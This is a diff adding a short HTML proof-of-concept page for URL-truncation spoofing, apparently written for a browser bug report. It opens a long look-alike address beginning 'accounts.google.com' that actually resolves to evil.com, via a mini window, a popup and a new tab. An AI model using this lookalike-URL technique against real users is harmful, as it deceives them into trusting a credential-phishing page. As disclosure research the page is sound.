@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>URL Truncation Spoofing PoC</title>
+</head>
+<body>
+<h2>URL Truncation Spoofing — PoC</h2>
+
+<!-- Method A: Mini Window -->
+<p><b>Method A — Mini Window:</b> Right-click → "Open in Mini Window"</p>
+<a href="https://accounts.google.com.signin.verify.identity.security.check.authentication.session.validate.confirm.authorize.protect.evil.com/login">
+    Open in Mini Window
+</a>
+
+<!-- Method B: Popup -->
+<p><b>Method B — Popup:</b></p>
+<button onclick="window.open('https://accounts.google.com.signin.verify.identity.security.check.authentication.session.validate.confirm.authorize.protect.evil.com/login','test','width=700,height=500')">
+    Open Popup
+</button>
+
+<!-- Method C: Direct Link -->
+<p><b>Method C — Direct Link (New Tab):</b></p>
+<a href="https://accounts.google.com.signin.verify.identity.security.check.authentication.session.validate.confirm.authorize.protect.evil.com/login" target="_blank">
+    Open in New Tab
+</a>
+</body>
+</html>
